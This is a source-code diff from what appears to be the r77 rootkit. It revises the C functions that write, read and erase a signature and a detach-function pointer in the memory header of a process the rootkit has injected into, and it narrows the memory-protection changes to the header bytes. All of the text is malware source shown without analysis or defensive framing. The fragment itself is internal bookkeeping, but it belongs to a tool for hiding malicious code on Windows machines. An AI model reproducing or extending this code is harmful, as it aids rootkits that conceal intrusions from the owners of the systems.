@@ -7,10 +7,10 @@ WORD GetR77Header(LPVOID *detachAddress)
 	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
 	if (module)
 	{
-		WORD signature = *(LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];
+		WORD signature = *(LPWORD) & module[R77_HEADER_OFFSET];
 		if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
 		{
-			if (detachAddress) *detachAddress = (LPVOID) * (PDWORD64) & module[sizeof(IMAGE_DOS_HEADER) + 2];
+			if (detachAddress) *detachAddress = (LPVOID) * (PDWORD64) & module[R77_HEADER_OFFSET + 2];
 			return signature;
 		}
 	}
@@ -26,13 +26,13 @@ BOOL WriteR77Header(WORD signature, LPVOID detachAddress)
 	if (module)
 	{
 		// The r77 header is written over the DOS stub.
-		LPWORD signaturePtr = (LPWORD) & module[sizeof(IMAGE_DOS_HEADER)];
+		LPWORD signaturePtr = (LPWORD) & module[R77_HEADER_OFFSET];
 
 		// Do not write the signature, if this process already has an r77 signature.
 		if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
 		{
 			DWORD oldProtect;
-			if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
+			if (VirtualProtect(signaturePtr, 10, PAGE_READWRITE, &oldProtect))
 			{
 				// Check again right before writing to mitigate a race condition.
 				if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
@@ -41,9 +41,9 @@ BOOL WriteR77Header(WORD signature, LPVOID detachAddress)
 					*signaturePtr = signature;
 
 					// Write a function pointer that can be invoked using NtCreateThreadEx to detach the injected library gracefully.
-					*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)detachAddress;
+					*(PDWORD64)&module[R77_HEADER_OFFSET + 2] = (DWORD64)detachAddress;
 
-					VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
+					VirtualProtect(signaturePtr, 10, oldProtect, &oldProtect);
 					result = TRUE;
 				}
 			}
@@ -57,15 +57,16 @@ VOID RemoveR77Header()
 	LPBYTE module = (LPBYTE)GetModuleHandleW(NULL);
 	if (module)
 	{
-		DWORD oldProtect;
-		if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
-		{
-			// Remove the r77 header by overwriting the DOS stub.
-			// Even if this sequence of bytes doesn't match the original DOS stub, it does not affect the process.
-			*(LPWORD)&module[sizeof(IMAGE_DOS_HEADER)] = 0x1f0e;
-			*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = 0xb821cd09b4000eba;
+		LPWORD signaturePtr = (LPWORD) & module[R77_HEADER_OFFSET];
 
-			VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
+		DWORD oldProtect;
+		if (VirtualProtect(signaturePtr, 10, PAGE_READWRITE, &oldProtect))
+		{
+			// Remove the r77 header by overwriting the signature in the DOS header.
+			*(LPWORD)&module[R77_HEADER_OFFSET] = 0;
+			*(PDWORD64)&module[R77_HEADER_OFFSET + 2] = 0;
+
+			VirtualProtect(signaturePtr, 10, oldProtect, &oldProtect);
 		}
 	}
 }
